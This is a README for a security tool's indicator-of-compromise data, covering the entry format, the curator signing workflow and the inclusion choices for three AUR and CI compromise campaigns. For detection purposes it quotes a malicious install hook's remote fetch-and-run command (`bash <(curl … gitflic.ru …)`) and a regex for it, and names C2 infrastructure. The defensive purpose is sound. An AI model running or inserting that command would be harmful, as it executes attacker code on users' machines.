# IOC baseline source data

Curated indicator lists that `scripts/build_ioc_baseline.py` turns into signed
IOC federation baselines (see [the IOC reference](../../docs/reference/ioc.md)
and A13b in [the security model](../../docs/security-design/security-model.md)).

**These files must contain only primary-sourced, confirmed indicators.** An IOC
match is stated to the user as attribution ("this artifact is on curator X's
known-bad list for incident Y"), so a wrong or invented entry is worse than no
entry: a bad `package` value is a permanent false positive, and a fabricated
hash or domain destroys the trust the whole federation depends on. `example.json`
uses deliberately fake, RFC 2606 `.example` values and exists only to show the
format; it is not a real indicator set and must not be published.

## Entry format

Each file is a JSON array. Every entry needs `type` and `value`; the rest are
optional but strongly encouraged.

| Field | Required | Meaning |
|-------|----------|---------|
| `type` | yes | `domain`, `hash`, `package`, `file_path`, or `pkgbuild_pattern`. |
| `value` | yes | The indicator. Domains are normalised to the registered domain and IDNA-folded; hashes must be hex of a known length; package names are matched case-insensitively; file paths are POSIX-normalised and case-sensitive; patterns are compiled and refused if they risk catastrophic backtracking. |
| `confidence` | recommended | `confirmed` is the strongest tier. |
| `provenance` | recommended | Where the indicator comes from: an advisory id or URL. `evidence_url` is accepted and folded into `provenance`. |
| `campaign` / `incident` | recommended | The incident identifier the entry belongs to. |
| `expires_at` | recommended | ISO 8601. An expired indicator is reported as expired, not silently dropped, and drops out of `ioc list` by default. |
| `added` / `first_seen` | optional | ISO 8601 first-seen date. |

## Curation workflow

Indicator extraction is human-reviewed on purpose; nothing here is scraped from
an untrusted source and signed automatically.

1. A harvester (a separate project, not this repo) watches the Arch security
   mailing list, AUR commit history and takedown notices, and proposes
   candidate entries for review.
2. A curator confirms each candidate against primary evidence and writes it into
   a file here, one per incident (for example `atomic-arch-2026-06.json`).
3. The curator builds and signs the baseline:

   ```
   python scripts/build_ioc_baseline.py \
       --from-file data/iocs/<incident>.json \
       --source <curator> \
       --incident <incident> \
       --out ioc-baselines/<incident> \
       --sign <ed25519-private-key>
   ```

    The build self-verifies against the real importer, so a produced directory
    is guaranteed to import. Publish `ioc-baselines/<incident>/`; the
    curator's public key is carried by its manifest, not pinned in
    `[baselines.ioc]` configuration.

4. Verify on a clean database:

   ```
   trustsight ioc import ioc-baselines/<incident>
   trustsight inspect <a-package-that-should-match>
   ```

## A note on picking indicators

Prefer the **narrowest** indicator that identifies the compromise: the malicious
tarball's `hash` or the attacker's `domain`, not the package name. A `package`
indicator flags that name forever, which becomes a false positive the moment the
package is cleaned up and re-published. Reserve `package` for names that were
created solely to carry the payload, and always set `expires_at`.

## Curation notes

`atomic-arch-2026-06.json` carries the full payload indicator set from the
report: `nextfile-js`, the `deps` ELF `sha256`/`md5`, a secondary `sha256`, the
Tor C2 onion, the two install-hook paths, the three eBPF pinned maps, and the
two wave-3 ANSI-C obfuscation markers. It deliberately **excludes** some names
that appear in community compromise lists:

- `ansi-colors`, `minimist`, `chalk` - legitimate or decoy npm packages pulled
  alongside the payload, not indicators.
- `temp.sh` - a legitimate file-sharing service the payload uploaded to; it is a
  network pattern, not an IOC.
- `raw.gitubusercontent.com` - a typosquat domain mentioned in the aur-general
  thread but not confirmed as attacker infrastructure.

The AUR package names themselves are kept out of the IOC layer entirely: they
were remediated, so a `package` entry on them would flag a cleaned-up package
forever. They live, as an exposure reference only, under `data/aur-compromised/`.

`aur-typosquat-2026-10.json` covers the two typosquat waves the watcher flagged
on 2026-10-14 - fifteen names around `yay` and fourteen around
`brave-beta-bin`, sharing one malicious `<pkg>.install` carrier (`sha256`
`4b46e737…b75d`) that runs
`bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/…' 2>/dev/null)`.
The package cluster here is attacker-**created**, not hijacked, so a `package`
entry is correct where the Atomic-Arch names were not: these names have no
legitimate history to revert to. Two deliberate choices:

- `firefox-git-bin` is **excluded as a `package` indicator although it was
  compromised**, not because it is clean. It is a long-standing legitimate
  package (maintainer `VitalyR`, Mozilla's release signing key) that the
  attacker *hijacked*: the recipe is byte-intact and the payload was appended to
  its pre-existing `firefox-git-bin.install` (199 bytes, `sha256`
  `4b46e737…b75d`, byte-identical to the carriers above). Like the Atomic-Arch
  names it is remediated, so a `package` entry would flag a cleaned-up package
  forever; the `hash` indicator below already covers this hook. Its presence in
  the brave cluster is a *true* positive of the adoption-window correlation (the
  attacker took maintainership of it alongside the clones), not a heuristic
  miss.
- The archival-indirection `pkgbuild_pattern` is pinned to the embedded host
  (`web\.archive\.org/web/\S*gitflic\.ru`) rather than to any archive URL that
  embeds a second one. A host-agnostic shape would flag every PKGBUILD that
  legitimately fetches a vanished upstream through `web.archive.org`; an IOC is
  incident attribution, so it names what this campaign actually used.

`ghostaction-2026-10.json` carries the GhostAction campaign indicators that a
local analyser can match against a diff: the three C2 IP literals, the
`*.oast.fun` callback, the three hygiene-themed workflow filenames, and the
`AKIA_CTX_START` credential-context marker. Two spec-listed shapes are
deliberately **not** indicators here:

- `REPO=` is a body marker but also an ordinary shell assignment; as a
  `pkgbuild_pattern` it would flag a large share of clean PKGBUILDs.
- the commit string "Add security audit workflow" is metadata, not recipe
  content, so a PKGBUILD/module scan never sees it.

The C2 addresses are written as bounded `pkgbuild_pattern` regexes rather than
`domain` entries: domain normalisation keeps the registered domain, which turns
an IP literal into its last two octets (`193.32.204.199` becomes `204.199`).
The victim-repository list rides the signed federation channel as
`upstream_repo` entries, not this local file (U007/U008 are federation-fed).
